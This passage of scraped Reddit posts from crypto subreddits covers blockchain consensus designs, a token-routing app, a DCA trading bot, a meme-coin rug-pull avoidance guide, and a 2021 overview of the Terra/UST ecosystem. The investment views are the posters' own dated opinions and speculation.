uses distributed hash table (dht). instead of trying to manage global consensus for every change to a huge blockchain ledger, every participant has their own signed hash chain. in case of multi-party transaction, it is signed to each party's chain. each party signs the exact same transaction with links to each of their previous chain entries. after data is signed to local chains, it is shared to a dht where every neighbor node validate it. any consensus algorithms can be built on top of holochain. [26] komodo ('delegated' delayed proof of work (dpow)) - end-to-end blockchain solutions. dpow consensus mechanism does not recognize the longest chain rule to resolve a conflict in the network, instead the dpow looks to backups it inserted previously into the chosen pow blockchain. the process of inserting backups of komodo transactions into a secure pow is “notarization.” notarisation is performed by the elected notary nodes. roughly every ten minutes, the notary nodes perform a special block hash mined on the komodo blockchain and take note of the overall komodo blockchain “height”. the notary nodes process this specifc block so that their signatures are cryptographically included within the content of the notarized data. there are sixty-four “notary nodes” elected by a stake-weighted vote, where ownership of kmd represents stake in the election. they are a special type of blockchain miner, having certain features in their underlying code that enable them to maintain an effective and cost-efcient blockchain and they periodically receives the privilege to mine a block on “easy difculty.” post with references you can find here: https://bitcointalk.org/index.php?topic=2936428.msg30170673#msg30170673",156,48,0.99,2018-02-23 07:23:14,web3,CryptoTechnology,tracyspacygo,False,122.7

I’m Building a Web App that helps you find the best route from token X on any network/exchange to token Y on any network/exchange.,"i started dabbling into defi a few months ago. between all the new jargon and the concepts that i had to learn, finding the best route to turn coin x on network xx to coin y on network yy was very frustrating to me. i alway found myself in situations like these: * i have some usdc that i’m staking on beefy on fantom network and i saw a better opportunity (a ust farm on osmosis for example), so how can i move usdc from fantom and turn it into ust on osmosis? and more importantly, what’s the most efficient way to do that? * i have usdt on binance, and want to switch them to ust on terra-station to stake on anchor protocol. * i have wbtc on avalanche, and want to get afusdc on solana. * etc .. you get the idea to me, the first thing to do in these situations was to use google. usually i had to go through multiple posts and multiple answers (usually here on r/defi) to find the right answer. sometimes i found outdated answers, and sometime i found none. i remember on multiple times that i spent around 1 hour to plan the best route for complicated scenarios. so i decided to fix this problem once and for all by building a web app where you enter source coin, source network, destination coin and network, and then you get a number of different routes to choose from. the resulting routes will be visually shown, plus you get a detailed written steps of what you have to do. something like: * swap usdc to usdt on spirit swap. * bridge usdt to eth on sushi swap. * bridge eth from ethereum to avalanche on multichain. * etc …. here is a few samples of how the results will look like: https://preview.redd.it/u1jcuudth4x81.png?width=1167&format=png&auto=webp&s=b720c1874a89500c5bf3f074b5a4e4e772e226cd https://preview.redd.it/rfxcix1vh4x81.png?width=1151&format=png&auto=webp&s=0211863632d31eb29ffbed88eb7791075663c5fc it’s also worth mentioning that the app will support centralised exchanges (binance, kucoin, etc). it will take into consideration the networks available for each token on these cefi exchanges, as well as defi exchanges (spooky swap, trader joe, etc) and of course bridges (like multi chain, terra bridge, etc). do you think you will need something like this? do you think it will save you time/effort? to gauge interest, i created a mail list for anyone who is interested to hear from me when the web app is live. here you go: [http://x2y.money](http://x2y.money/) (redirects to a goole form) (i will never spam you. you will only hear from me once the app is live. )",132,80,0.98,2022-05-02 16:36:26,web3,defi,amashq,False,121.0

(to be fair they were really rude lol) somebody made a follow up post making fun of them for asking the question basically saying if we knew that we wouldn't be here blah blah. (to be fair also a good point lol) that person sent me a message saying they were disheartened and didn't want to be a part of the community anymore because they were made fun of. my point being: we were all newbies at some point. we can all learn from each other. we all ask a 'stupid' question eventually and therefore i'm just asking for us to be more compassionate with each other. if you don't know the answer to the question, ok. if you think the answer is obvious, explain the solution simply so it is obvious to everybody. and just try not to be a 🍆 and to those people who spend their free time here helping others, i salute and appreciate you 🙏 ❤ 🙌 👏",129,84,0.99,2021-12-15 11:57:56,web3,defi,Naturalista93,False,120.9
I built DCAStack.com - An Automated Dollar Cost Averaging Bot for Crypto!,"**dca stack - an automated dollar cost averaging bot for your crypto** twitter: https://twitter.com/dcastack website: https://www.dcastack.com/ source: https://github.com/shazman96/dcastack &nbsp; *why?* &nbsp; i built this web app because i was so fed up with the lack of options in dollar cost averaging. the current situation with dca is: * exchanges don't offer recurring buys and if they did, the fees are outlandish (1% or more) * trading bot websites are difficult to use or lack exchange support * competition is too expensive (some charge 20 bucks a month for this with limited features) so dca stack was born. built for the community, completely free hoping to restore your purchasing power :) it'll be free since it's just an early preview and i have no plans to monetize right now. it also offers exchange connectivity to over 100+ exchanges. &nbsp; *how does it work?* &nbsp; it works by directly interfacing with the apis you generate on your exchanges. what this means is that it trades on your behalf with funds on your account, you don't send any funds to the website. all trading takes place within your exchange at all times. for this to work, your api keys need to be enabled with trading permissions and retrieving account balances. please **never ever** enable withdrawal permissions. we don't need it and we want to keep everyone safe by mitigating the risk of using your api keys with bots. now i know what my mom used to say about trusting strangers on the internet with your api keys and crypto...so i also made the source code public! you can view, audit, and raise issues on anything you find strange. initially, i wasn't going to but in the spirit of ""don't trust, verify"", i figured the only way people would ever use a service like this is knowing it is safe to use. this should be the standard in the world of crypto and anything that uses your api keys to trade for you. &nbsp; *note on bugs :o* &nbsp; there may be bugs so please only use funds you're willing to spend and keep only the funds necessary to facilitate order trading per your dca. looking forward to the community's thoughts and getting early user feedback!",105,120,0.95,2022-01-09 10:25:34,web3,defi,SatsStacker69,False,120.5

How to reduce your chances of getting rugged: A high-level overview,"hey all, so starting with the obvious, as this run picks up and as new people are jumping into meme coins after watching some experienced youtubers trade thinking this is easy, we're seeing a lot more ""i got rugged"" and ""how did this rug?"" posts. i wanted to give you something that might actually be helpful amidst all the sarcasm that litters the comment sections on rug posts. i hope it's ok for me to post something like this. i've made some less extensive versions of this in some replies to said threads, but i've fleshed it out for a full post. if you've seen those comments, there's more here. \-------- disclaimer: let me say this now, i am in no way recommending you trade meme coins, or any crypto for that matter. this is in no way financial advice and i will not be taking any responsibility for losses. i am in no way trying to increase your confidence in trading these tokens with this info, you get into this understanding full-well the risks involved and should only trade/invest with money you're comfortable losing. in fact, i'm hoping some of you will think twice or at least wait once you realise there's a lot more going on than you initially thought. if you feel like you absolutely must continue, understand that the title of this guide is more for your attention as what i'm covering are the bare minimum basics you need for trading and identifying scams with any crypto, meme or otherwise. this post assumes you already know about rugcheck, which you should be running every coin's ""contract address (ca)"" through before buying. this post is a little unstructured and there is definitely more to it that this, but this is a good high-level starting point. at the very least, i hope this sparks a healthy google session on your end if there are things in here you haven't heard of or don't understand at all. there's more to this than buying and hoping for a good result. if you see some terms in quotation marks, chances are those are what you should be googling. you don't know what you don't know so hopefully there's a few gems in here. \-------- **rugcheck:** so to start, you need to be looking at more than just the ""good"" marker in rugcheck. most notably, the posts like ""the liquidity was locked, how did this rug?"" or even worse, ""how did they unlock the liquidity after it was locked?"" can be avoided by going just a bit deeper. understand that you can't ""unlock"" the liquidity pool once it's been locked/burned. very rarely only a portion of the pool is locked and they yank the rest out, the other 99% of the time what you're seeing is this: if 3 or 4 out of the 5 top wallets (including the raydium wallet) have random small percentages of the token and there was no ""presale"" (these also aren't always great), then chances are high it could be the other popular scam, *dumping*. this often is in the form of the dev having kept a massive chunk of the supply, sometimes like 90%+ and spread it across a hundred wallets to trick the ""holder ownership"" check. the scam here is they're planning on dumping (selling) on everyone when they're happy with the price/market cap. just one of the tell-tale signs of this is when the token launches at an already high market cap due to a massive amount of the tokens already being owned. when you see all the liquidity gone after a dump scam like this where the lp was locked, that's not the same as the dev pulling out the liquidity (the other most popular scam). liquidity goes up and down depending on the amount of tokens that are being held. if 90% of tokens get dumped, obviously that means there's less liquidity. 2 different scams. also tokens with ""mutable metadata"" still enabled, i've found, have a lower chance of running well and having strong second waves as it could be one of many listings the dev changes the names, images and socials for later to hide his long list of repeated scams. not that they can't run and that this is true 100% of the time, it's just something to keep in mind. &#x200b; **getting in, getting out, and trading safe:** i shouldn't need to tell you this, but don't just ape into anything until you see that liquidity pool locked. also don't get cocky kid and sit there trying to race the dev to see if you can buy and sell at a profit before he pulls the unlocked liquidity out. familiarise yourself with the ""fibonacci scale"" (google this and how it works in crypto, it's an incredible phenomenon) and use it to look for pullbacks if you're unsure where to get in. meme coins in particular often dive deep into 0.618 - 0.786 territory and can bounce back if there's enough ""volume"", which is something you also need to watch and learn about, though this is never certain and is based on many things. if it's diving past 0.786, this could absolutely be the point of no return and it might be time to take your profits or your 20-30% loss and move on, and that's ok. trust your gut, don't over-stay. also if you're there early, it might be a good idea to not buy until you see at least a good portion of the big sell-off by the dudes running scripts with their own nodes. you can never beat them and can't partake in what they're doing without big money, 10g internet and a lot of knowledge. they're the ones that bought on block 0 (usually the first big green candle(s). learn what the candles and wicks mean and how to read them). no, the ""snipe"" feature of your unibot/trojan or other run-of-the-mill tg bot is not what this is in the slightest, so don't get excited. understand that sometimes you'll be waiting an hour or more for an (in my opinion) actually decent coin worth your time to pop up. don't rush or fomo, take your time. when looking at a graph, enable the ""ema"" ""indicator"" and watch the average. once enabled, i like to double click the ema line and set the length to 20 and change the colour to orange so it's better visible. is the ema line going down? probably not a good idea to buy or try to catch red candle ""falling knives"", that's when you should consider taking profits if you're in, or getting out completely. do you see a some strong ""higher lows"" and the average line going up? that's when you might consider buying, again, if there's enough volume, strength, and confidence in the coin where it may continue to go up. it most certainly won't always. also don't always just buy when you see a big green line. as i'm sure you've noticed, there's almost always a small sell after each buy. sometimes you should wait for that red that comes after the green hit the ema line. buy there to stop that small amount of loss and increase your overall gain. sometimes it's also worth waiting for the coin you wish to trade to break some milestones first before getting in. is it struggling and ""consolidating"" a lot at the 10k, 20k, 50k, 100k, etc market cap? it might be best to wait to see if it breaks through before jumping in, and if it doesn't, check fib again to see if you can get in on a correction. learn about these common ""support/resistance mcap levels"" and learn about ""confluency"", which is a different type of support level again based on previous all-time highs (aths) and lows. this is part of the psychology section of this game that you must learn. also learn about the different ""waves"" or ""phases"". when a coin is just released and you're getting in, thats a wave 1 strategy. when a coin has taken off already and is a very high volume/market cap coin, you can absolutely milk the ups and downs with a wave 2 strategy. keep an eye on the coins that absolutely ran to see if you can get in on subsequent waves. some of these coins can bounce up and down between the same confluency points 2, 3 sometimes even 4 times making 2x gains every time. &#x200b; **the telegram trading bots + dexscreener/birdeye and alternatives:** lastly, the telegram bots like bonkbot and trojan (formerly unibot), while useful and feature-rich, many of us have found can be slow and janky. dexscreener and birdeye, believe it or not, are also slow to update the graph and liquidity lock, and sometimes it'll need a refresh for the lock to appear. i've gotten used to using the graphs and trading from within photon instead. i've found the graphs and liquidity status update far quicker than dexscreener and it has its own trading bot as part of the platform that is notably quicker than the tg bots. it also never felt right to be buying and selling on freaking telegram of all places. if you're serious about this, you want all the speed you can get and that goes without saying. *sidenote: i do have a referral link for photon i'd be happy to dm. full disclosure, we both get something out of it. it didn't feel right just posting my link here but i'd be happy to if the mods are ok with it and feel it's been deserved.* what many of us on photon do to vastly reduce the amount of scams clogging up our eyes and brains is to filter the new pairs list to only show those with ""mint auth"" disabled and ""at least 1 social"". one thing i like about and still use bonkbot for, however, is the alert channels (i'm sure many tg bots and channels provide something like this). i like to unmute the ""burned"" channel (the one with the fire emoji), as it tells me and sends notifications of when liquidity locks on every token, sometimes faster than even photon. i check the notification and if its the coin i'm looking at getting into, it'll help me make a decision quicker. no matter what platform you're using though, it's also a good idea to check the search bar for other coins with the same or similar name while rug checking, to see if that coin has either been done to death or if it's a scam that's been being milked 8 times a day. look at those coins, are the images and socials the same? did they rug every time? high chance of scam. i also check to make sure the ca matches with the ca listed on the coin's website (if it has one) if they've put it there, to make sure its not some reused crap. it's common to see copycat scam clones of coins that actually did run 30min, a day, or even a month ago. &#x200b; **so you became an overnight millionaire...** **tax - the unspoken headache:** you need to know this, so don't scroll away after you have heart palpitations reading that title. there's a very easy way to handle this. depending on what country you live in, crypto will be handled differently at tax time. in australia, if you make long term holds or ""investments"", you're considered an ""investor"" and are treated with ""capital gains tax (cgt)"". if you make a lot of little trades like we're talking about, you're considered a ""trader"" and so it'll be treated as ""income tax"". you're expected to literally record every single trade you make including the date of the trade, the amount, and the value of that coin at that time. this is not even close to doable considering how many times you buy and sell each coin in a day as a trader through tg bots and photon. so get into some good software for this. i use crypto tax calculator here in australia, koinly is another popular one used worldwide. research different ones. you connect all your wallets up to it, yes, the wallet id from every exchange you use, your phantom/metamask wallet, and your photon/bonkbot/unibot/trojan etc wallet, everything. you then get it to make you a report that you give to your tax man at the end of every financial year. accountants can even be connected to your software directly, just like xero and other real money tax software. the software should be able to read all the previous transactions you made before adding it to your setup, but don't quote me on this. another tip that's more advanced but is absolutely recommended, is you shouldn't be investing and trading coins in your personal name. some of you may already be too late for this, but set up a ""trust"" or your country's equivalent, and trade as the ""trustee"" of that trust. speak to your accountant about this. there are 2 major reasons to do this. keep in mind this may work differently in different countries: 1. this one might be a bit confusing and hard to explain in text, but google it. if i make massive gains and i own and have been trading everything in my name, i'm up for all that tax myself as personal income. i'd just be throwing all that money away in tax. with a family trust, i can nominate members of my family and friends as ""beneficiaries"" of that trust. this allows me to delegate and split the gains however i like to those people. if it reaches a point where after tax, i'll still be receiving the same or similar amount whether i pay tax on thew whole thing or split everything above that to someone else, i can give them a piece of the pie! they'll be paying income tax on their portion too though, but less is being wasted in tax and i can share my wealth! this isn't limited to crypto, it can be leveraged for stocks and investment properties like real estate as well. 2. if something happens and i'm being chased for my assets for whatever reason, there's a layer of separation between myself and those assets, as i personally don't own them. the trust does. if you make a trust after you've started, and you want to transfer all your assets into the trust, keep in mind, in my country at least, that when you make the transfer it will be counted as you selling the assets even if you didn't receive anything for it. so this triggers a capital gains scenario, where you as an individual will have to pay capital gains or claim a capital loss based on how those assets appreciated or depreciated since you acquired them. again, seek financial advice. &#x200b; **to conclude:** understand from now that you're never gonna win every trade, no one does. if people are winning 60% - 70% of the time then that's considered good. people refer to memes as crypto gambling and for good reason, but the odds can be in the green if you know what you're doing. don't get greedy, smaller profits like 1.2x - 1.8x or whatever are fine and you should be happy with that. it's possible to make a handful of those a day. don't force any trades because you think you have to make a trade. wait and if nothing good pops up in your time at your desk, then it is what it is. not everything is a 3x - 20x, in fact very few will be if you're doing this properly and sustainably. don't chase it and stay up late trading tired and frustrated. you also don't need to be getting in to just ""new pairs"". you may even consider smaller gains on some already less volatile, semi-established/""trending"" coins. don't get me wrong, there's definitely some mega-money to be made in this game, but not for 99% of us. you'll see that day's best opportunity pass you by the more you watch. you might be in the right place at the right time and make the right call on the next big blow-out, but don't count on it. keep your emotions in check. take your time and play with 0.1 or 0.2 sol purchases for a few days or weeks until you can now see things you couldn't before. have conviction not just in your buying but perhaps most importantly, also in your selling. final note, have a long term plan in place as well. you should be mixing short term trading into long term investing. if you're winning in sol, don't blow it, allocate some into a broader portfolio of coins that can run this bullrun and come out on top. that's your real goal in crypto. if this is all greek to you, slow down and get educated. stay safe. you're a trader, not a gambler. act like it. much love avs",125,87,0.97,2024-03-26 01:07:56,web3,solana,Avsynth,True,119.50000000000001

(Part 2) Deep dive into Terra Ecosystem,"hello all, this is gonna be a long post. in celebration of binance listing ust and luna breaking 100$, i would like to update my [original post](https://www.reddit.com/r/defi/comments/ok9xhq/deep_dive_into_terra_ecosystem/) nearly half a year ago on the terra ecosystem. there's a ton of euphoria right now, and so its always good to take a look back at the fundamentals. a lot has changed since then and by now i'm sure many more people have heard about terra, maybe even used some of its dapps. for those that are brand new, i recommend reading my original post first. for those wondering if it's too late to get into luna, i will present why i think luna still has much room to grow. i won't cover every protocol, just the ones i think are most interesting/significant. still, there's a lot to go through so let's get started. **a quick refresher** terra is a blockchain developed by terraform labs based on cosmos sdk (this is important because it allows terra to connect to all other blockchains in the cosmos ecosystem, more on this later). their main products are a suite of algorithmic stablecoins, the most prominent being ust tied to the dollar. ust retains its peg through its relationship with luna, where luna absorbs the volatility of ust. luna is minted when selling ust, and burned when buying ust. in practice, 1$ of luna **always equals** 1$ of ust, even if ust loses its peg. this creates arbitrage opportunities, where if ust is at 1.50$, you can sell 1$ of luna for 1.50$ ust and immediately bank 50% profit. this increases supply of ust as people sell luna for ust and the peg returns to 1. in reverse, if ust is at .50$, people buy 1$ of luna with .50$ ust, which decreases ust supply until the peg returns to 1. again, videos on this below: [https://www.youtube.com/watch?v=7hlizxkbxfy&t=917s](https://www.youtube.com/watch?v=7hlizxkbxfy&t=917s) [https://www.youtube.com/watch?v=hl8tcvhyhmm](https://www.youtube.com/watch?v=hl8tcvhyhmm) stablecoins are the most important product in all of crypto, no question about it. i honestly can't imagine a time without stablecoins when people took profits into btc, itself a highly volatile asset. but stablecoins are also not a risk-less product, they are subject to regulators scrutiny and issued by sometimes shady companies (cough...tether) that may or may not have the funds available to prevent a bank run. a decentralized stablecoin for defi is a no-brainer, and ust is the best of the best currently (dai is backed by centralized stablecoins and both dai and mim are supply constrained, in that they can only be minted with collateral. there are no limits on how much ust can be minted). protocols on terra are important to the extent that they drive organic demand for ust. in other words, luna can survive and thrive even if all protocols on terra die out as long as ust is adopted by other blockchains as their main stablecoin. this sets terra apart from others, its goal is not competing with solana, ethereum, avalanche, or any of the other l1s, its goal is to create the most robust and usable algorithmic stablecoin for all of crypto. a bet on luna is a bet on the adoption of ust. keep this in mind. [this graphic was created in july though at that point we only had anchor and mirror running. now many of these projects have launched or are soon to launch! \(though a lot of them are terminated as well\)](https://preview.redd.it/i9yaexxb2e781.png?width=2364&format=png&auto=webp&s=09544f1c9143236c0d080d14d800ea392e8dbbce) launched: anchor, mirror, angel, valkyrie protocol, pylon protocol, starterra, angel, talis, hero, apollo, spectrum, orion money, kado, chai, loterra, loop, stader, nexus, harpoon (now kujira). soon to launch: mars, kinetic, ozone, suberra, alice, levana, astroport, prism, spar, white whale, neptune, glow. i may have missed some so let me know if i did. even with all these new protocols, the core of the terra ecosystem is still anchor, so let's see what has changed since. **anchor: savings and borrowing** last time i wrote about anchor it was burning reserves and had just been given a lifeline by tfl. deposits and borrows were a fraction of what they are today. tvl in the protocol has grown exponentially and is one one of the top 10 defi protocols across all chains. impressive, considering it operates only on the terra blockchain whereas many other protocols exist across blockchains. just recently, anchor devs announced their intent to make anchor a cross-chain platform, which would undoubtedly bring in even more capital. on top of that, yield reserves have been growing quite consistently with the addition of beth and rising value of luna. however, with deposits continuing to eclipse borrows, there will eventually come a point when anchor can no longer sustain its close to 20% interest rate. tfl has been transparent about the fact that the rate cannot be sustained forever, so lowering rates is not cause for panic. even 15% is far better than any traditional banks or other stablecoin earning dapps/wallets (celsius 8%, [crypto.com](https://crypto.com) 12%, etc). when this happens, i believe devs should implement a tiered structure of interest rates rewarding those that hold anc tokens with higher interest. but until then, enjoy your 20% for as long as it lasts :) [current total deposits\/borrow vs. the time of my first post. interestingly, that little blip in borrows during the may crash at the time felt like a disaster. today you can barely see the drop.](https://preview.redd.it/s9n1e238me781.png?width=1992&format=png&auto=webp&s=6153917a151a9a852dec5ce01b9e53d68f1eb7f6) **mirror: synthetic assets** 24/7 trading of the most popular stocks from anywhere in the world on the blockchain, what's not to like? unfortunately, mirror has run into some problems in its time. at one point holding nearly 2b in tvl, mirror today has only half of that according to defillama. on mirror itself, the tvl statistic has been removed from the landing page. what happened to mirror? i believe there were 3 main factors involved: 1. execution 2. regulation 3. full decentralization 1. even in its heyday, mirror listed new assets far too slowly. and when it did, it listed things like mdot or mbtc, synthetic versions of cryptocurrencies which serves no discernible purpose other than for lps to farm mir tokens. because all anyone was doing was farming mir, the price of mir fell and has not been doing much since. perhaps mirror could have done better by focusing on more exotic asset classes to list (commodities?) that would attract new capital into the protocol, but it may be too late for that now considering... 2. regulations. it started when uniswap delisted synthetic tokens from their dex frontend, this included all mirror based tokens. shortly thereafter, we learned that do kwon (founder of tfl) was served (albeit unjustly) a subpoena by the sec at mainnet 2021 over mirror. hardly surprising that the sec would be concerned about a synthetic stock market. although do pushed back against the sec by suing them back, this created a lot of fud regarding mirror and cast its future into shadows. 3. perhaps as a result of these events, tfl relinquished any control of mirror and turned it into a fully decentralized protocol run 100% by the community. although decentralization is regarded as the holy grail in crypto, it became quickly apparent that full decentralization too soon without any leadership is not beneficial to anyone. a quick look at [mirror governance](https://mirrorprotocol.app/#/gov) tells the story. [full decentralization without leadership is a mess.](https://preview.redd.it/mt3iotvwqe781.png?width=1974&format=png&auto=webp&s=1ae5bf4d5e51827c63d0e9e95817b5eeea52d130) long story short, i think mirror is unfortunately a dying protocol (contrary to my original thesis) and there's not much i can see that would save it. on the bright side, there are plenty of new protocols that have since launched or are launching that will soak up the value of mirror, let's take a look at some of the most prominent ones. **launched:** **nfts:** nfts arrived on the terra blockchain with the same insane excitement as any other blockchain. one of the earliest and most hyped projects was galactic punks (punks in space) which minted on [randomearth](https://randomearth.io/home). since then tens if not hundreds of additional projects have launched and minted. i won't talk about any of them individually in detail as there are just too many. feel free to browse randomearth! my personal favorite is definitely [hero](https://www.heronft.io/). just look at do kwon's profile picture, how cool is that? https://preview.redd.it/s3syp6w6te781.png?width=772&format=png&auto=webp&s=be5b08f68aeb46cc593bfbdb40887f2a456db389 [**pylon**](https://gateway.pylonprotocol.com/)**/**[**starterra**](https://starterra.io/): both of these are launchpads on terra, and both are pretty unique in terms of launchpads. pylon was the first and incubated by tfl. it uses a clever system called ""pylon pools"", where users can deposit ust in exchange for tokens from new project launches where the amount is determined based on how long you lock your ust, options being a 3 month/6 month/12 months vesting period. this is a ""risk-less"" investment in that you recover your original ust amount at the end of the vesting period, and also allows smoother project launches that dampen price volatility. there is also pylon swap, where users that stake pylon's own governance token mine are allocated a certain amount of new project tokens in a presale (though these are much rarer with the preferred being pylon pools. overall the protocol works as its intended, though there have been criticisms that mine stakers are not rewarded enough for holding mine. the team behind pylon is working on improving benefits for stakers with recently implemented retroactive airdrops for long term stakers. i am excited to see what other innovative launches they come up with in the future. starterra is the first gamified launchpad where stakers are divided into 1 of 3 factions and rewards are allocated differently to the stronger of the factions. to be honest, i have not looked much into this project as their launch was very rocky and received a lot of community distrust. however, i know that since then the team has worked hard to improve their reputation with the community and projects are continuing to partner with starterra. anyone more involved, feel free to comment below on this project! [**loterra**](https://loterra.io/): if crypto isn't gambling enough, you're welcome to gamble more with loterra! basically a lottery protocol that charges 1ust per ticket and draws every 3 days. there are some cool features though. lota stakers are rewarded a portion of every lottery winning including jackpots. there is also the ability to play ""lossless"" lottery, where it uses anchor yield to buy recurring tickets whilst keeping your principal amount intact. [**orion money**](https://orion.money/): one of if not the most anticipated and hyped up project launches on terra which to be honest up to this point has done little more than disappoint. orion is a stablecoin savings protocol that leverages the yield of anchor on other blockchains. it allows deposits of usdc, usdt, busd, and others on ethereum, bsc, and polygon and pays up to 15% interest by converting and depositing these coins into anchor. it was said to be the one to open the floodgates to the masses. however, orion has not seen the expected growth as tvl has stagnated and even fallen over the past few months with only a couple hundred million in tvl, this compared to anchor's 5 billion in ust deposits (over the same period anchor deposits increased by several billion). furthermore, orion hyped up its airdrop for months and required all recipients to stake to the orion validator in order to be eligible. months of staking led to a measly 1% of all tokens being airdropped to loyal stakers. of course, free money is free money, but it still leaves a sour taste in your mouth. with ust now being available on binance (listed today), huobi (listed yesterday), kucoin, and potentially many more exchanges to come, ust on-ramp will become increasingly easy and there is little reason to not use anchor directly within terra. that being said, credit is due for a solid team and an innovative product that unfortunately just has not gained much traction. [**apollo**](https://app.apollo.farm/)**/**[**spectrum**](https://terra.spec.finance/vaults): both are yield compounders that do exactly what they are supposed to do, there's not much more to say here. use them to boost your yield on lp pairs within the terra ecosystem. spectrum launched a bit under the radar but has since proved its robustness with audits and ui enhancements. apollo had a pre-launch token mining program which was a great success and one of the fairest launches to date. kudos to both platforms. [**nexus**](https://nexusprotocol.app/)**:** nexus is a yield optimizer leveraging anchor earn and borrow. during the may crash, many accounts borrowing ust on anchor were liquidated when the price of luna used as collateral (called bluna) plummeted. new borrowers became hesitant to borrow for fear that they would be liquidated overnight. if there are no borrowers, anchor earn cannot sustain its high interest and the protocol would collapse. nexus aims to help alleviate the problem by providing a system of automated loan managements. you deposit bluna into their vault which they use to borrow ust at a preset ratio safe from liquidation and autonomously readjusts itself to maintain the same rate. the borrowed ust is then deposited into anchor earn, the interest from borrowing and depositing is used to buy psi tokens, and the psi tokens are used to pay interest to those depositing bluna into the vault. [**kujira**](https://kujira.app/): the japanese word for whale. contrary to nexus protecting from liquidations, kujira aims to allow everyone the opportunity to benefit from liquidations, whereas before, liquidations would be sniped by bots. kujira lets you bid for liquidated bassets (bluna, beth) at a discount to their current value by depositing ust. it works like a charm from what i can tell, though i haven't personally used it (feel kind of bad profiting off people being inadvertently liquidated...but free market and all that, the option is there). [**stader**](https://staderlabs.com/): probably the most interesting protocol in this list. stader is a liquid staking and auto-compounding platform that allows you to stake luna without any unbonding period (usually 21 day unlock on terrastation). the base yield from luna is compounded automatically while still allowing stakers to receive all the airdrops they would have received if they had just staked luna normally. in exchange for staking luna on the platform, you are given a token called lunax, which is a representation of your stake much like how your ust turns into aust when you deposit into anchor. lunax will open up a whole new world of degen leverage opportunities that are currently in the works. check out the video below, i don't think i can explain better than him. [https://www.youtube.com/watch?v=l0ptngucp88&t=621s](https://www.youtube.com/watch?v=l0ptngucp88&t=621s) [**angel**](https://www.angelprotocol.io/): a one of a kind charity protocol that is always worth a mention. angel provides perpetual donations using yield generated from staked luna. it runs a validator for staking luna, and all interest generated from staked luna is given to charities. it is a great concept and definitely worth supporting. to date they have already donated hundreds of thousands of dollars to various charities around the world that you can see on their website. other launched projects (that i am not very familiar with) include, terrafloki, loop, valkyrie, and maybe others i've missed. and onto the up-and-coming projects, there are a few highly anticipated ones around the corner. **coming soon** [**astroport**](https://astroport.fi/)**:** can you believe terra has the second highest tvl of any chain without a fully fledged amm dex? neither can i. astroport, incubated by [delphi labs](https://delphidigital.io/labs) (a big investor and supporter of terra who also helped design axie infinity), aims to be terra's go-to exchange. currently there is only terraswap, which is essentially a re-skinned version of mirror's backend that leaves a lot of functions to be desired. people who've been in the ecosystem all know the number of times terraswap has broken or been hit with stupidly high slippage out of nowhere. astroport is launching in a few days and is currently in phase 2 of its ""lockdrop"" campaign, a 3 step process to ensure the dex launches with substantial liquidity already provided and rewarding early providers with astro tokens. it is a bit complex but if you're interested it is quite an innovative model and you can read about it [here](https://astroport.medium.com/countdown-initiated-announcing-astroports-astrodrop-and-launch-date-229d3d8b61cb). phase 2 is ongoing and you still have the opportunity to contribute to the astro liquidity bootstrapping pool for astro rewards if you want to! [https://lockdrop.astroport.fi/active-phase](https://lockdrop.astroport.fi/active-phase) astroport will make the terra ecosystem even more robust and give users one more reason to never leave again. the dex launches in 3 days! [**ozone**](https://agora.terra.money/t/ozone-insurance-mechanism-v2-1/914): terra's native insurance protocol has been in the works for some time. it will allows you to buy insurance in case of ust depeg, smart contract risks, etc. ozone was funded recently by tfl with \~4 billion ust from burning the luna held in their community funds. last month, risk harbor announced they would be in charge of operating ozone. [https://finance.yahoo.com/news/risk-harbor-announces-charge-terras-150000785.html](https://finance.yahoo.com/news/risk-harbor-announces-charge-terras-150000785.html) when this project finally launches, it will provide safety assurance for many users, opening up the ecosystem even more to the masses. as a side note, the community pool burn of luna resulted in so many fees that will go to pay staking interest that the rewards for staking nearly doubled to around 9-10% per year and will remain consistent for the next few years. [**mars**](https://twitter.com/mars_protocol): another project incubated by delphi labs, mars is a lending and borrowing protocol set to launch early next year. not much is known about it yet, but it is also highly anticipated. you can watch this video to learn more about it [https://www.youtube.com/watch?v=2waib2\_jseg&t=394s](https://www.youtube.com/watch?v=2waib2_jseg&t=394s) [**white whale**](https://www.whitewhale.money/)**:** allows retail investors to help maintain ust's peg and profit from arbitrage opportunities by pooling assets. [**levana**](https://levana.finance/): short for leverage any asset, basically does what its name suggests. it will allow you to go full degen and buy leveraged assets such as 2x luna. what's not to like? [**prism**](https://prismfinance.app/): a very innovative protocol that will split yield-bearing assets such as luna into principle and yield components, name pluna and yluna, where one represents the base token and the other represents the future yield of the base token. this allows you to do things like theoretically borrowing against your future yield revenue. i am very excited to see the full functionality of this protocol once it goes live. **airdrops** finally, we can't talk about terra protocols without talking about airdrops. almost every protocol launched on terra has had some form of airdrop to different participants in the ecosystem, particularly luna stakers. it is a tradition i expect will continue. even projects launching on other blockchains have airdropped or will airdrop luna stakers, including comdex and shade protocol on secret network (all part of overall cosmos ecosystem). [full airdrop chart, credit to crypto\_carlosa on twitter for making and updating it.](https://preview.redd.it/vgo1vqylkg781.png?width=1856&format=png&auto=webp&s=e1f085619c143b41853ca8ac719f21a245725e4a) **beyond terra** terra now has a whole suite of defi projects driving demand for ust, but ust is not limited to terra. since i last wrote about terra, ust has found its way to solana, fantom, harmony, and linked with other cosmos blockchains through cosmos ibc and been listed on osmosis (the premier dex for all cosmos-based blockchains, ust serving as the de-facto stablecoin). as regulation around centralized stablecoins inevitably continues to tighten, i predict defi ecosystems will increasingly adopt ust as their central stablecoin. ust has also appeared on several centralized exchanges since, the most notable being binance just this morning (a great xmas gift for all). it is also listed on kucoin, huobi (just yesterday), coinbase pro, and others. though being listed on cexes is not the premier goal of ust, it definitely drives adoption and lowers barrier of entry for anyone who wants to enter the terra ecosystem, which is a great thing for all. rumor has it (though not really a rumor anymore since do kwon confirmed it) that tfl is in talks with the government of busan to in some way utilize their stablecoins. if it ever comes to fruition, it would represent a killer use-case and validation for decentralized stablecoins used by a government. however, government bureaucracy moves slow so i wouldn't hold my breath. **spending ust** the big question on everyone's minds is how to even spend all that yield, assuming you aren't a complete degen leveraging everything to the limits. so what options are out there? chai: a payment company that launched with terra in the beginning and uses terra stablecoins. it can be used in korea and is actually a huge use-case for terra that i haven't mentioned but is worth a further look if you are interested. [crypto.com](https://crypto.com): my go-to method. just transfer your luna and convert to usdc/usdt (they haven't listed ust yet) and top up your visa debit card. i don't wanna shill for cdc but fuck it their card is awesome (its metal from second tier up), the benefits are great, and its so easy to use. and just a tip, the [crypto.com](https://crypto.com) app exchange rates are god-awful so its better to sell your luna first on binance or elsewhere and transfer busd to cdc over binance smart chain (super low fees), then convert to usdc/usdt to top up (no fees for 